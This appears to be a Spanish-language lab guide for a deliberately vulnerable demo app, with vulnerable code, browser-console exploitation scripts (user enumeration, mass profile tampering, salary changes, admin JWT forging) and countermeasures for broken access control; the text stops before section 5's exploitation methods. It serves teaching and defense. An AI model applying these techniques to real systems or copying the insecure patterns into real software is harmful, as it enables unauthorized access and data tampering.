# Guía Actualizada - Vulnerabilidades Broken Access Control (CFT)

## 📋 Índice de Vulnerabilidades

1. [IDOR - Insecure Direct Object Reference](#1-idor---insecure-direct-object-reference)
2. [Escalada de Privilegios Horizontal](#2-escalada-de-privilegios-horizontal)
3. [Escalada de Privilegios Vertical](#3-escalada-de-privilegios-vertical)
4. [Exposición de Información Sensible](#4-exposición-de-información-sensible)
5. [Manipulación de Roles y Permisos](#5-manipulación-de-roles-y-permisos)
6. [Vulnerabilidades en JWT](#6-vulnerabilidades-en-jwt)

---

## 🏗️ Arquitectura del Sistema CFT

### **⚠️ IMPORTANTE: Cómo Funciona el CFT**

El CFT (Centro de Formación Técnica) **NO tiene un backend real**. Es una aplicación completamente frontend que simula vulnerabilidades usando:

- **📁 Base de datos simulada**: Array en memoria en `api.ts`
- **🎭 API simulada**: Funciones que imitan requests HTTP 
- **🔑 JWT simulado**: Tokens creados con base64, no criptografía real
- **⏱️ Delays simulados**: Para imitar latencia de red

### **🛠️ Métodos de Explotación Disponibles**

#### **✅ FUNCIONAN (Recomendados):**
1. **`window.debugAPI`** - Acceso directo a datos (modo desarrollo)
2. **Navegación manual** - Cambiar URLs para acceder a perfiles
3. **Manipulación de localStorage** - Modificar tokens y datos de usuario
4. **Interceptación en DevTools** - Usar Network tab para ver requests

#### **❌ NO FUNCIONAN:**
1. **`fetch()` a endpoints API** - No hay servidor backend real
2. **Requests externos** - Todo es simulación local
3. **Bases de datos reales** - Solo arrays en memoria

### **🎯 Para Mejores Resultados:**
- Usa `window.debugAPI` cuando esté disponible
- Si `debugAPI` no existe, usa métodos manuales de navegación
- Todos los scripts incluyen métodos alternativos de fallback

---

### **Base de Datos Simulada (JSON)**
El sistema utiliza una base de datos simulada en memoria almacenada en `services/api.ts`:

```javascript
let usersDatabase: User[] = [
  {
    id: 1, username: 'admin', role: 'admin',
    profile: { fullName: 'Administrador de sistema', salary: 120000, ssn: '123-45-6789' }
  },
  {
    id: 2, username: 'jaranguiz', role: 'user',
    profile: { fullName: 'Juan Aranguiz Salas', salary: 65000, ssn: '987-65-4321' }
  },
  {
    id: 3, username: 'james', role: 'user',
    profile: { fullName: 'James Blond Von Gonzalez', salary: 70000, ssn: '456-78-9012' }
  },
  {
    id: 4, username: 'rob', role: 'user',
    profile: { fullName: 'Rob Spon Ja', salary: 60000, ssn: '789-01-2345' }
  }
];
```

### **Credenciales de Prueba**
- **Admin**: `admin` / `admin123`
- **Usuario 1**: `jaranguiz` / `user123`
- **Usuario 2**: `james` / `user123`  
- **Usuario 3**: `rob` / `user123`

---

## 1. IDOR - Insecure Direct Object Reference

### 📝 **Descripción**

IDOR ocurre cuando la función `getUserById()` permite acceso directo a cualquier usuario basándose en el ID proporcionado, sin validar autorización.

### 🎯 **Ubicación en la Aplicación**

- **Frontend API**: `getUserById()` en `services/api.ts` (líneas 105-130)
- **Frontend UI**: `/profile/:id` - Componente Profile.tsx

### 🔍 **Código Vulnerable**

```javascript
// services/api.ts
export const getUserById = async (id: number): Promise<User> => {
  await simulateNetworkDelay();
  
  // Simular verificación de token (vulnerable)
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inválido');
  }

  // 🚨 NO HAY VALIDACIÓN: Cualquier usuario autenticado puede ver cualquier perfil
  const user = usersDatabase.find(u => u.id === id);
  
  if (!user) {
    throw createHttpError(404, 'Usuario no encontrado');
  }

  // Retornar usuario sin password pero con datos sensibles
  const userWithoutPassword = { ...user };
  delete (userWithoutPassword as any).password;
  
  return userWithoutPassword;
};
```

### 💥 **Formas de Explotación**

#### **Método 1: Manipulación de URL en el Frontend**
1. Login como `jaranguiz` (usuario ID: 2)
2. Navegar a `/profile/2` (tu perfil) ✅
3. Cambiar URL a `/profile/1` ❌ - Accede al perfil de admin
4. Cambiar URL a `/profile/3` ❌ - Accede al perfil de james
5. Cambiar URL a `/profile/4` ❌ - Accede al perfil de rob

#### **Método 2: Manipulación Directa en DevTools**
```javascript
// Abrir DevTools → Console y ejecutar:

// 1. Verificar tu token actual
console.log('Mi token:', localStorage.getItem('token'));
console.log('Mis datos:', JSON.parse(localStorage.getItem('user') || '{}'));

// 2. MÉTODO PRINCIPAL: Acceso directo a datos via debugAPI
const exploreUsers = () => {
  if (window.debugAPI && window.debugAPI.usersDatabase) {
    console.log("🔍 ACCESO DIRECTO A BASE DE DATOS DETECTADO");
    const users = window.debugAPI.usersDatabase;
    
    users.forEach(user => {
      console.log(`
👤 Usuario ${user.id}: ${user.username}
📝 Nombre: ${user.profile?.fullName}
💰 Salario: ${user.profile?.salary?.toLocaleString()}
🆔 SSN: ${user.profile?.ssn}
📞 Teléfono: ${user.profile?.phone}
🏢 Departamento: ${user.profile?.department}
🔐 Rol: ${user.role}
      `);
    });
    
    return users;
  } else {
    console.log("❌ debugAPI no disponible. MÉTODOS ALTERNATIVOS:");
    console.log("   1. Navegar manualmente a /profile/1, /profile/2, /profile/3, /profile/4");
    console.log("   2. Usar herramientas de red del navegador para interceptar datos");
    console.log("   3. Revisar el código fuente en la pestaña Sources");
    
    // Mostrar datos disponibles en localStorage
    console.log("📋 Datos en localStorage:", {
      token: localStorage.getItem('token'),
      user: JSON.parse(localStorage.getItem('user') || '{}')
    });
  }
};

// Ejecutar exploración
exploreUsers();
```

#### **Método 3: Script Automático de Enumeración**
```javascript
// Script para enumerar todos los usuarios sistemáticamente
const enumerateUsers = async () => {
  console.log("🔍 INICIANDO ENUMERACIÓN DE USUARIOS");
  const discoveredUsers = [];
  
  // Método 1: Si debugAPI está disponible (modo desarrollo)
  if (window.debugAPI && window.debugAPI.usersDatabase) {
    console.log("📍 Usando debugAPI para acceso directo");
    const users = window.debugAPI.usersDatabase;
    users.forEach(user => {
      discoveredUsers.push({
        id: user.id,
        username: user.username,
        fullName: user.profile?.fullName,
        salary: user.profile?.salary,
        ssn: user.profile?.ssn,
        phone: user.profile?.phone,
        department: user.profile?.department
      });
      console.log(`✅ Usuario ${user.id} encontrado:`, user.username);
    });
  } else {
    // Método 2: Navegación manual por URLs
    console.log("📍 debugAPI no disponible. Usa navegación manual:");
    console.log("   1. Ve a /profile/1 para ver admin");
    console.log("   2. Ve a /profile/2 para ver jaranguiz");  
    console.log("   3. Ve a /profile/3 para ver james");
    console.log("   4. Ve a /profile/4 para ver rob");
    
    // Método 3: Acceso a datos desde localStorage/sessionStorage
    const userData = localStorage.getItem('user');
    if (userData) {
      console.log("📋 Tu información actual:", JSON.parse(userData));
    }
  }
  
  if (discoveredUsers.length > 0) {
    console.table(discoveredUsers);
  }
  return discoveredUsers;
};

// Ejecutar enumeración
enumerateUsers();
```

### 🛡️ **Contramedidas**

#### **1. Validación de Ownership (Nivel Básico)**
```javascript
export const getUserById = async (id: number): Promise<User> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inválido');
  }

  // ✅ Validar que el usuario solo pueda acceder a su propio perfil
  if (id !== decoded.id && decoded.role !== 'admin') {
    throw createHttpError(403, 'Acceso denegado: No puedes acceder a este perfil');
  }
  
  const user = usersDatabase.find(u => u.id === id);
  
  if (!user) {
    throw createHttpError(404, 'Usuario no encontrado');
  }

  const userWithoutPassword = { ...user };
  delete (userWithoutPassword as any).password;
  
  return userWithoutPassword;
};
```

#### **2. Filtrado de Datos Sensibles**
```javascript
const filterSensitiveData = (userData: User, requestingUser: any) => {
  const baseData = {
    id: userData.id,
    username: userData.username,
    email: userData.email,
    role: userData.role,
    created_at: userData.created_at
  };
  
  // Solo mostrar datos completos al propio usuario o admin
  if (userData.id === requestingUser.id || requestingUser.role === 'admin') {
    return {
      ...baseData,
      profile: userData.profile
    };
  }
  
  // Para otros usuarios, solo información básica
  return {
    ...baseData,
    profile: {
      fullName: userData.profile?.fullName,
      department: userData.profile?.department
      // Salary, SSN, phone no incluidos
    }
  };
};
```

---

## 2. Escalada de Privilegios Horizontal

### 📝 **Descripción**

La función `updateUser()` permite a cualquier usuario modificar el perfil de otros usuarios del mismo nivel de privilegios.

### 🎯 **Ubicación en la Aplicación**

- **Frontend API**: `updateUser()` en `services/api.ts` (líneas 132-170)
- **Frontend UI**: Formulario de edición en Profile.tsx

### 🔍 **Código Vulnerable**

```javascript
// services/api.ts
export const updateUser = async (id: number, userData: Partial<User['profile']>): Promise<void> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inválido');
  }

  // 🚨 NO HAY VALIDACIÓN: Cualquier usuario puede modificar cualquier perfil
  const userIndex = usersDatabase.findIndex(u => u.id === id);
  
  if (userIndex === -1) {
    throw createHttpError(404, 'Usuario no encontrado');
  }

  // Actualizar perfil
  usersDatabase[userIndex].profile = {
    ...usersDatabase[userIndex].profile,
    ...userData
  };

  console.log(`🚨 VULNERABILITY EXPLOITED: User ${decoded.username} (ID: ${decoded.id}) modified user ${id}`);
};
```

### 💥 **Formas de Explotación**

#### **Método 1: Interceptar y Modificar via DevTools**

**Usando las herramientas de desarrollador:**
1. Login como `jaranguiz` (ID: 2)
2. Ir al perfil de otro usuario via URL: `/profile/3`
3. Si el formulario de edición está disponible, modificar los datos
4. **O ejecutar directamente en console:**

```javascript
// MÉTODO PRÁCTICO: Manipular datos directamente en debugAPI (si está disponible)
if (window.debugAPI && window.debugAPI.usersDatabase) {
  console.log("🚨 ACCESO DIRECTO A BASE DE DATOS DETECTADO");
  
  // Ver datos actuales del usuario objetivo (James, ID: 3)
  const targetUser = window.debugAPI.usersDatabase.find(u => u.id === 3);
  console.log("📋 Datos originales de James:", targetUser);
  
  // Modificar directamente (simulando escalada horizontal)
  if (targetUser) {
    const originalData = { ...targetUser.profile };
    
    // Realizar modificación maliciosa
    targetUser.profile = {
      ...targetUser.profile,
      fullName: "James HACKEADO por " + JSON.parse(localStorage.getItem('user')||'{}').username,
      phone: "+56-555-HACKED",
      department: "Departamento Comprometido"
    };
    
    console.log("✅ Datos modificados exitosamente:");
    console.log("   Original:", originalData);
    console.log("   Modificado:", targetUser.profile);
    console.log("🔄 Navega a /profile/3 para ver los cambios");
  }
} else {
  console.log("❌ debugAPI no disponible. Métodos alternativos:");
  console.log("   1. Usar herramientas de red del navegador");
  console.log("   2. Modificar datos via formularios de la UI");
  console.log("   3. Buscar endpoints de API expuestos");
}
```

#### **Método 2: Script Masivo de Modificación**
```javascript
// Script para modificar múltiples perfiles usando acceso directo
const modifyAllUsers = async () => {
  if (!window.debugAPI || !window.debugAPI.usersDatabase) {
    console.log("❌ debugAPI no disponible. Usar métodos manuales.");
    return;
  }
  
  const currentUserData = JSON.parse(localStorage.getItem('user') || '{}');
  console.log(`🚨 Atacando desde usuario: ${currentUserData.username}`);
  
  const maliciousUpdate = {
    fullName: "USUARIO HACKEADO",
    phone: "+56-555-PWNED",
    department: "SECURITY BREACH"
  };
  
  window.debugAPI.usersDatabase.forEach(user => {
    if (user.id !== currentUserData.id) {
      const originalData = { ...user.profile };
      
      // Aplicar modificación maliciosa
      user.profile = {
        ...user.profile,
        ...maliciousUpdate,
        fullName: maliciousUpdate.fullName + ` (por ${currentUserData.username})`
      };
      
      console.log(`✅ Usuario ${user.id} (${user.username}) modificado:`);
      console.log(`   Antes: ${originalData.fullName}`);
      console.log(`   Después: ${user.profile.fullName}`);
    } else {
      console.log(`⏭️ Saltando usuario propio (ID: ${user.id})`);
    }
  });
  
  console.log("🏁 Ataque masivo completado");
  console.log("🔄 Navega a /admin para ver todos los cambios");
};

// Ejecutar ataque
modifyAllUsers();
```

#### **Método 3: Modificación Específica de Datos Sensibles**
```javascript
// Manipular salarios específicamente usando acceso directo
const manipulateSalaries = () => {
  if (!window.debugAPI || !window.debugAPI.usersDatabase) {
    console.log("❌ debugAPI no disponible. MÉTODOS ALTERNATIVOS:");
    console.log("   1. Usar formularios de edición en la UI");
    console.log("   2. Interceptar requests en Network tab");
    console.log("   3. Modificar datos via /admin si está accesible");
    return;
  }
  
  const users = window.debugAPI.usersDatabase;
  const salaryUpdates = [
    { id: 1, salary: 50000, reason: "Reducir salario del admin" },
    { id: 3, salary: 150000, reason: "Aumentar salario de James" },
    { id: 4, salary: 200000, reason: "Aumentar salario de Rob" }
  ];
  
  salaryUpdates.forEach(update => {
    const user = users.find(u => u.id === update.id);
    if (user && user.profile) {
      const oldSalary = user.profile.salary;
      user.profile.salary = update.salary;
      
      console.log(`💰 ${update.reason}:`);
      console.log(`   Usuario: ${user.username} (${user.profile.fullName})`);
      console.log(`   Salario anterior: ${oldSalary?.toLocaleString()}`);
      console.log(`   Salario nuevo: ${update.salary.toLocaleString()}`);
    }
  });
  
  console.log("🏁 Manipulación de salarios completada");
  console.log("🔄 Ve a /admin para verificar los cambios");
};

// Ejecutar manipulación
manipulateSalaries();
```

### 🛡️ **Contramedidas**

#### **1. Validación de Ownership Estricta**
```javascript
export const updateUser = async (id: number, userData: Partial<User['profile']>): Promise<void> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inválido');
  }

  // ✅ Solo el propietario o admin puede modificar
  if (id !== decoded.id && decoded.role !== 'admin') {
    throw createHttpError(403, 'Forbidden: No puedes modificar datos de otros usuarios');
  }
  
  const userIndex = usersDatabase.findIndex(u => u.id === id);
  
  if (userIndex === -1) {
    throw createHttpError(404, 'Usuario no encontrado');
  }

  // Actualizar perfil
  usersDatabase[userIndex].profile = {
    ...usersDatabase[userIndex].profile,
    ...userData
  };

  console.log(`✅ User ${decoded.username} successfully updated user ${id}`);
};
```

#### **2. Logging y Auditoría**
```javascript
const securityLog: any[] = [];

const logSecurityEvent = (event: string, user: any, target: any, details: any) => {
  const logEntry = {
    timestamp: new Date().toISOString(),
    event,
    user_id: user.id,
    username: user.username,
    user_role: user.role,
    target_user_id: target,
    details,
    suspicious: user.id !== target && user.role !== 'admin'
  };
  
  securityLog.push(logEntry);
  
  if (logEntry.suspicious) {
    console.warn('🚨 SECURITY ALERT: Unauthorized access attempt', logEntry);
  }
  
  return logEntry;
};

// Integrar en updateUser
export const updateUser = async (id: number, userData: Partial<User['profile']>): Promise<void> => {
  // ... validaciones previas
  
  // Log del evento
  logSecurityEvent('user_profile_update', decoded, id, userData);
  
  // ... resto del código
};
```

---

## 3. Escalada de Privilegios Vertical

### 📝 **Descripción**

La función `getAllUsers()` permite a usuarios normales acceder a funciones administrativas sin verificar el rol de administrador.

### 🎯 **Ubicación en la Aplicación**

- **Frontend API**: `getAllUsers()` en `services/api.ts` (líneas 174-200)
- **Frontend UI**: `/admin` - Componente AdminPanel.tsx

### 🔍 **Código Vulnerable**

```javascript
// services/api.ts
export const getAllUsers = async (): Promise<User[]> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inválido');
  }

  // 🚨 FALLA: No verifica si es admin
  console.log(`🚨 VULNERABILITY EXPLOITED: User ${decoded.username} (role: ${decoded.role}) accessed admin user list`);

  // Retornar usuarios sin passwords pero con datos sensibles
  return usersDatabase.map(user => {
    const userWithoutPassword = { ...user };
    delete (userWithoutPassword as any).password;
    return userWithoutPassword;
  });
};
```

### 💥 **Formas de Explotación**

#### **Método 1: Acceso Directo a Panel Admin**
1. Login como usuario normal (`jaranguiz`)
2. Navegar directamente a `/admin` en el frontend
3. La interfaz se carga y muestra todos los usuarios con datos sensibles

#### **Método 2: Llamada Directa a la Función**
```javascript
// MÉTODO PRÁCTICO: Acceder a datos administrativos
const accessAdminData = () => {
  if (window.debugAPI && window.debugAPI.usersDatabase) {
    console.log("🚨 ACCESO NO AUTORIZADO A DATOS ADMINISTRATIVOS:");
    console.log("💾 Base de datos completa accesible via debugAPI");
    
    const users = window.debugAPI.usersDatabase;
    console.log(`📊 Total de usuarios encontrados: ${users.length}`);
    
    users.forEach(user => {
      console.log(`
👤 Usuario: ${user.username}
📧 Email: ${user.email}
🏢 Rol: ${user.role}
💰 Salario: ${user.profile?.salary?.toLocaleString()}
🆔 SSN: ${user.profile?.ssn}
📞 Teléfono: ${user.profile?.phone}
🏢 Departamento: ${user.profile?.department}
      `);
    });
    
    return users;
  } else {
    console.log("❌ debugAPI no disponible en producción");
    console.log("🔄 Alternativamente:");
    console.log("   1. Navega a /admin para ver interfaz administrativa");
    console.log("   2. Usa herramientas de red para interceptar requests");
    console.log("   3. Revisa localStorage/sessionStorage para datos cacheados");
    
    // Verificar datos en localStorage
    const userData = localStorage.getItem('user');
    if (userData) {
      console.log("📋 Datos de usuario en localStorage:", JSON.parse(userData));
    }
  }
};

// Ejecutar acceso administrativo
accessAdminData();
```

#### **Método 3: Extracción Masiva de Datos**
```javascript
// Script para extraer y procesar todos los datos administrativos
const extractAllAdminData = () => {
  if (!window.debugAPI || !window.debugAPI.usersDatabase) {
    console.log("❌ debugAPI no disponible. Usar métodos alternativos:");
    console.log("   1. Navegación manual a /admin");
    console.log("   2. Inspección de Network tab en DevTools");
    console.log("   3. Análisis de datos en localStorage");
    return null;
  }
  
  const users = window.debugAPI.usersDatabase;
  
  // Crear resumen ejecutivo
  const adminSummary = {
    total_users: users.length,
    admin_count: users.filter(u => u.role === 'admin').length,
    total_payroll: users.reduce((sum, u) => sum + (u.profile?.salary || 0), 0),
    departments: [...new Set(users.map(u => u.profile?.department))],
    sensitive_data: {
      ssns: users.map(u => ({ name: u.profile?.fullName, ssn: u.profile?.ssn })),
      phones: users.map(u => ({ name: u.profile?.fullName, phone: u.profile?.phone })),
      salaries: users.map(u => ({ name: u.profile?.fullName, salary: u.profile?.salary }))
    }
  };
  
  console.log("📊 RESUMEN ADMINISTRATIVO EXTRAÍDO:");
  console.table(adminSummary);
  
  // Guardar en variable global para acceso posterior
  window.extractedData = adminSummary;
  
  // Mostrar información crítica
  console.log("🚨 INFORMACIÓN CRÍTICA EXTRAÍDA:");
  console.log("💰 Nómina total: $" + adminSummary.total_payroll.toLocaleString());
  console.log("👥 Administradores:", users.filter(u => u.role === 'admin').map(u => u.username));
  console.log("🏢 Departamentos:", adminSummary.departments);
  
  return adminSummary;
};

// Ejecutar extracción
extractAllAdminData();
```

### 🛡️ **Contramedidas**

#### **1. Validación de Rol de Administrador**
```javascript
export const getAllUsers = async (): Promise<User[]> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inválido');
  }

  // ✅ Verificar rol de administrador
  if (decoded.role !== 'admin') {
    console.warn(`🚨 Unauthorized admin access attempt by user: ${decoded.username} (Role: ${decoded.role})`);
    throw createHttpError(403, 'Acceso denegado: Se requieren privilegios de administrador');
  }

  console.log(`✅ Admin access granted to user: ${decoded.username}`);

  return usersDatabase.map(user => {
    const userWithoutPassword = { ...user };
    delete (userWithoutPassword as any).password;
    return userWithoutPassword;
  });
};
```

#### **2. Sistema de Permisos Granular**
```javascript
// Definir permisos específicos
const PERMISSIONS = {
  'users.read_all': ['admin'],
  'users.read_own': ['admin', 'user'],
  'users.write_any': ['admin'],
  'users.write_own': ['admin', 'user'],
  'users.delete': ['admin'],
  'system.read': ['admin']
};

const hasPermission = (userRole: string, permission: string): boolean => {
  return PERMISSIONS[permission]?.includes(userRole) || false;
};

const requirePermission = (permission: string) => {
  return (decoded: any) => {
    if (!hasPermission(decoded.role, permission)) {
      throw createHttpError(403, `Acceso denegado: Se requiere permiso '${permission}'`);
    }
  };
};

// Uso en getAllUsers
export const getAllUsers = async (): Promise<User[]> => {
  // ... validaciones básicas
  
  // ✅ Verificar permiso específico
  requirePermission('users.read_all')(decoded);
  
  // ... resto del código
};
```

---

## 4. Exposición de Información Sensible

### 📝 **Descripción**

La función `getSystemInfo()` expone información crítica del sistema, incluyendo el JWT secret, a cualquier usuario autenticado.

### 🎯 **Ubicación en la Aplicación**

- **Frontend API**: `getSystemInfo()` en `services/api.ts` (líneas 256-285)
- **Frontend UI**: `/system` - Componente SystemInfo.tsx

### 🔍 **Código Vulnerable**

```javascript
// services/api.ts
const SYSTEM_CONFIG = {
  jwt_secret: 'vulnerable-secret-key', // 🚨 Secret expuesta
  server_info: 'Ubuntu 20.04',
  database_info: 'JSON Local Storage',
  debug_mode: true,
  last_backup: '2024-01-15',
  admin_users: ['admin'],
  total_users: usersDatabase.length
};

export const getSystemInfo = async (): Promise<SystemInfo> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inválido');
  }

  // 🚨 CUALQUIER usuario autenticado puede acceder
  console.log(`🚨 VULNERABILITY EXPLOITED: User ${decoded.username} accessed system info including JWT secret`);

  return {
    server: SYSTEM_CONFIG.server_info,
    database: SYSTEM_CONFIG.database_info,
    users_count: usersDatabase.length,
    admin_users: SYSTEM_CONFIG.admin_users,
    secret_key: SYSTEM_CONFIG.jwt_secret, // 🚨 MUY VULNERABLE
    last_backup: SYSTEM_CONFIG.last_backup,
    debug_mode: SYSTEM_CONFIG.debug_mode
  };
};
```

### 💥 **Formas de Explotación**

#### **Método 1: Acceso Directo a System Info**
```javascript
// MÉTODO PRÁCTICO: Acceder a configuración del sistema
const accessSystemInfo = () => {
  if (window.debugAPI && window.debugAPI.SYSTEM_CONFIG) {
    console.log("🚨 INFORMACIÓN CRÍTICA DEL SISTEMA OBTENIDA:");
    const config = window.debugAPI.SYSTEM_CONFIG;
    
    console.log("🔑 JWT Secret:", config.jwt_secret);
    console.log("👥 Usuarios Admin:", config.admin_users);
    console.log("🖥️ Servidor:", config.server_info);
    console.log("💾 Base de datos:", config.database_info);
    console.log("🐛 Modo debug:", config.debug_mode);
    console.log("💾 Último backup:", config.last_backup);
    console.log("📊 Total usuarios:", config.total_users);
    
    // Guardar secret para uso posterior
    window.stolenSecret = config.jwt_secret;
    
    console.log("💣 IMPACTO: Con esta información puedes:");
    console.log("   1. Forjar tokens JWT válidos");
    console.log("   2. Identificar cuentas administrativas");
    console.log("   3. Entender la arquitectura del sistema");
    console.log("   4. Planificar ataques más sofisticados");
    
    return config;
  } else {
    console.log("❌ debugAPI no disponible. Intentar métodos alternativos:");
    console.log("   1. Navegar a /system si existe endpoint");
    console.log("   2. Revisar código fuente en DevTools");
    console.log("   3. Interceptar requests de red");
    console.log("   4. Buscar archivos de configuración expuestos");
    
    // Buscar datos en localStorage que puedan revelar configuración
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      const value = localStorage.getItem(key);
      console.log(`📋 localStorage[${key}]:`, value);
    }
  }
};

// Ejecutar acceso a system info
accessSystemInfo();
```

#### **Método 2: Forjado de JWT con Secret Robada**
```javascript
// Una vez obtenida la JWT secret, crear tokens falsos
const createMaliciousToken = () => {
  // Verificar si tenemos acceso a la secret
  let stolenSecret = null;
  
  if (window.debugAPI && window.debugAPI.SYSTEM_CONFIG) {
    stolenSecret = window.debugAPI.SYSTEM_CONFIG.jwt_secret;
  } else if (window.stolenSecret) {
    stolenSecret = window.stolenSecret;
  } else {
    stolenSecret = 'vulnerable-secret-key'; // Secret conocida del código
  }
  
  console.log("🔑 Usando JWT secret:", stolenSecret);
  
  // Crear payload malicioso
  const maliciousPayload = {
    id: 999,
    username: 'super_hacker',
    email: 'hacker@evil.com',
    role: 'admin',
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60) // 1 año
  };
  
  // Simular creación de JWT (versión simplificada como en el código original)
  const header = btoa(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
  const payload = btoa(JSON.stringify(maliciousPayload));
  const signature = btoa(`signature_with_${stolenSecret}`);
  
  const fakeToken = `${header}.${payload}.${signature}`;
  
  console.log("🚨 TOKEN FALSO CREADO:", fakeToken);
  
  // Mostrar cómo usar el token
  console.log("💣 PARA USAR EL TOKEN FALSO:");
  console.log("   1. localStorage.setItem('token', '" + fakeToken + "');");
  console.log("   2. localStorage.setItem('user', '" + JSON.stringify(maliciousPayload) + "');");
  console.log("   3. Recarga la página");
  
  // Guardar para uso fácil
  window.maliciousToken = fakeToken;
  window.maliciousPayload = maliciousPayload;
  
  console.log("✅ Token guardado en window.maliciousToken para uso posterior");
  
  return fakeToken;
};

// Función helper para aplicar el token falso
const applyMaliciousToken = () => {
  if (window.maliciousToken && window.maliciousPayload) {
    localStorage.setItem('token', window.maliciousToken);
    localStorage.setItem('user', JSON.stringify(window.maliciousPayload));
    console.log("✅ Token falso aplicado. Recarga la página para usar credenciales falsas.");
  } else {
    console.log("❌ Ejecuta createMaliciousToken() primero");
  }
};

// Ejecutar creación de token falso
createMaliciousToken();

// Para aplicar: applyMaliciousToken();
```

#### **Método 3: Análisis Completo del Sistema**
```javascript
// Script para recopilar toda la información disponible
const fullSystemAnalysis = async () => {
  try {
    // 1. Obtener información del sistema
    const systemInfo = await api.getSystemInfo();
    
    // 2. Obtener lista completa de usuarios
    const allUsers = await api.getAllUsers();
    
    // 3. Compilar análisis completo
    const analysisReport = {
      timestamp: new Date().toISOString(),
      attacker: api.decodeCurrentToken(),
      system: {
        secret_exposed: systemInfo.secret_key,
        debug_enabled: systemInfo.debug_mode,
        backup_date: systemInfo.last_backup,
        admin_list: systemInfo.admin_users
      },
      users: {
        total: allUsers.length,
        admins: allUsers.filter(u => u.role === 'admin'),
        regular_users: allUsers.filter(u => u.role === 'user'),
        total_payroll: allUsers.reduce((sum, u) => sum + (u.profile?.salary || 0), 0),
        sensitive_data: allUsers.map(u => ({
          id: u.id,
          name: u.profile?.fullName,
          ssn: u.profile?.ssn,
          salary: u.profile?.salary,
          phone: u.profile?.phone
        }))
      },
      recommendations: [
        "JWT Secret completamente comprometida",
        "Todos los datos de usuarios accesibles",
        "Sistema completamente vulnerable",
        "Posible creación de tokens administrativos falsos"
      ]
    };
    
    console.log("📊 ANÁLISIS COMPLETO DEL SISTEMA:");
    console.log(analysisReport);
    
    // Guardar para referencia
    (window as any).systemAnalysis = analysisReport;
    
    return analysisReport;
    
  } catch (error) {
    console.log("❌ Error en análisis:", error.message);
  }
};

// Ejecutar análisis completo
fullSystemAnalysis();
```

### 🛡️ **Contramedidas**

#### **1. Separación de Configuración Sensible**
```javascript
// Configuración pública vs sensible
const PUBLIC_SYSTEM_CONFIG = {
  app_name: 'CFT Demo App',
  version: '1.0.0',
  environment: 'development',
  features: ['user_profiles', 'admin_panel']
};

const PRIVATE_SYSTEM_CONFIG = {
  jwt_secret: process.env.JWT_SECRET || 'should-be-from-env',
  database_connection: 'sensitive-connection-string',
  api_keys: {
    third_party_service: 'secret-api-key'
  }
};

export const getSystemInfo = async (): Promise<SystemInfo> => {
  // ... validaciones
  
  // ✅ Solo información pública disponible para usuarios normales
  if (decoded.role !== 'admin') {
    return {
      ...PUBLIC_SYSTEM_CONFIG,
      status: 'operational',
      uptime: Date.now() - startTime // Info no sensible
    };
  }
  
  // ✅ Información adicional solo para admins (pero sin secretos)
  return {
    ...PUBLIC_SYSTEM_CONFIG,
    users_count: usersDatabase.length,
    last_backup: SYSTEM_CONFIG.last_backup,
    debug_mode: SYSTEM_CONFIG.debug_mode,
    // ❌ NUNCA incluir: jwt_secret, passwords, api_keys
  };
};
```

#### **2. Anonimización y Filtrado**
```javascript
const sanitizeSystemInfo = (info: any, userRole: string) => {
  const baseInfo = {
    status: 'operational',
    version: info.version,
    features: info.features
  };
  
  if (userRole === 'admin') {
    return {
      ...baseInfo,
      users_count: info.users_count,
      server_stats: {
        uptime: info.uptime,
        memory_usage: 'normal'
      },
      // Secrets y configuración sensible NUNCA incluidos
    };
  }
  
  return baseInfo;
};
```

---

## 5. Manipulación de Roles y Permisos

### 📝 **Descripción**

La función `updateUserRole()` permite a cualquier usuario cambiar los roles de otros usuarios, incluyendo auto-promoción a administrador.

### 🎯 **Ubicación en la Aplicación**

- **Frontend API**: `updateUserRole()` en `services/api.ts` (líneas 225-255)
- **Frontend UI**: Select dropdown en AdminPanel.tsx

### 🔍 **Código Vulnerable**

```javascript
// services/api.ts
export const updateUserRole = async (id: number, role: string): Promise<void> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inválido');
  }

  const userIndex = usersDatabase.findIndex(u => u.id === id);
  
  if (userIndex === -1) {
    throw createHttpError(404, 'Usuario no encontrado');
  }

  // 🚨 NO HAY VALIDACIÓN: Cualquier usuario puede cambiar roles
  const oldRole = usersDatabase[userIndex].role;
  usersDatabase[userIndex].role = role;
  
  console.log(`🚨 VULNERABILITY EXPLOITED: User ${decoded.username} changed user ${id} role from ${oldRole} to ${role}`);
  
  // Si el usuario cambió su propio rol, actualizar el token en localStorage
  if (id === decoded.id) {
    const updatedUser = { ...usersDatabase[userIndex] };
    delete (updatedUser as any).password;
    const newToken = createSimpleJWT(updatedUser);
    localStorage.setItem('token', newToken);
    localStorage.setItem('user', JSON.stringify(updatedUser));
  }
};
```

### 💥 **Formas de Explotación**

